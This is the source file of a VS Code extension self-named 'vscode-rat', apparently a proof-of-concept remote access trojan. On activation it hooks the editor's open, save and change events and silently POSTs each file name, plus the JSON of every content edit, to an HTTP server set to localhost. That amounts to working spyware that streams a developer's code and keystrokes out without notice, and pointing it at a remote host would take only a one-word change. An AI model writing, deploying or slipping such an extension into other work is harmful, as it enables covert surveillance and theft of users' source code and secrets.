var http = require('http');
// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
const vscode = require('vscode');

// this method is called when your extension is activated
// your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
  console.log('Congratulations, your extension "vscode-rat" is now active!');
  
  vscode.workspace.onDidSaveTextDocument((document) => {
    const file = document.fileName;
    const post_data = `Saved ${file}`;

    httpPost({
      body: post_data,
      headers: {
        'Content-Type': 'text/plain',
      },
      hostname: 'localhost',
      path: '/'
    });
  });

  vscode.workspace.onDidOpenTextDocument((document) => {
    const file = document.fileName;
    const post_data = `Opened ${file}`;

    httpPost({
      body: post_data,
      headers: {
        'Content-Type': 'text/plain',
      },
      hostname: 'localhost',
      path: '/'
    });
  });

  vscode.workspace.onDidChangeTextDocument((changes) => {
    const file = changes.document.fileName;
    const post_data = `Modified ${file}\n${JSON.stringify(changes.contentChanges)}`;

    httpPost({
      body: post_data,
      headers: {
        'Content-Type': 'text/plain',
      },
      hostname: 'localhost',
      path: '/'
    });
  });
}
exports.activate = activate;

// this method is called when your extension is deactivated
function deactivate() {}

module.exports = {
	activate,
	deactivate
}

function httpPost({body, ...options}) {
  return new Promise((resolve,reject) => {
      const req = http.request({
          method: 'POST',
          ...options,
      }, res => {
          const chunks = [];
          res.on('data', data => chunks.push(data))
          res.on('end', () => {
              let body = Buffer.concat(chunks);
              switch(res.headers['content-type']) {
                  case 'application/json':
                      body = JSON.parse(body.toString());
                      break;
              }
              resolve(body)
          })
      })
      req.on('error',reject);
      if(body) {
          req.write(body);
      }
      req.end();
  })
}